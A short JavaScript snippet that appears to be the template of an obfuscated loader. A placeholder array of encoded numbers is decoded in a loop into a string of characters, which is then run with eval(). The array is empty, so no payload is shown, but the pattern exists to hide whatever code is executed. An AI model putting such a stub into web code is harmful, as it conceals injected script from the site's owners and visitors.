var a = [/*{get}*/];
var c = a.length;
var b = "";
for(var d=1;d<c;d++){a[d]=a[d-1]+a[d]+d;b+=String.fromCharCode(a[d])};
eval(b);
